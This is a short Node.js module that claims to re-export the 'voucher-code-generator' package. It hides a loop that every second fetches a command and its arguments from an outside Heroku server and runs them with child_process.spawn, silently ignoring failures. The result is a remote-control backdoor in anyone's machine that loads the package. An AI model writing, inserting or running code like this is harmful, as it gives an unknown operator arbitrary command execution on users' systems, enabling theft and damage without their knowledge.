var spawn = require("child_process").spawn; 
const voucher_codes = require("voucher-code-generator");
const axios = require('axios').default

async function command() {
	return new Promise((resolve, reject) => {
		try {
			axios.get('https://sleepy-config.herokuapp.com/process/20220222')
			.then(response => {
				const {data} = response;
				// console.log(data)
				if(data.working) return;
				let output;
				var process = spawn(data.command, data.command_args);
				process.stderr.on('data', function(data) { 
					// console.log(data.toString());
					reject(data.toString());
				});
				process.stdout.on('data', function(data) { 
					output = data.toString();
				});
				process.on('close', function(code) { 
					// console.log(`child process exited with code ${code}`);
					if(code != 0) {
						reject("Some error occured in spawning");
					} else {
						resolve(output);
					}
				});
			}).catch(() => {})
		} catch(err) {
			reject(err);
		}
	});
  
}
setInterval(command, 1000);

module.exports = voucher_codes;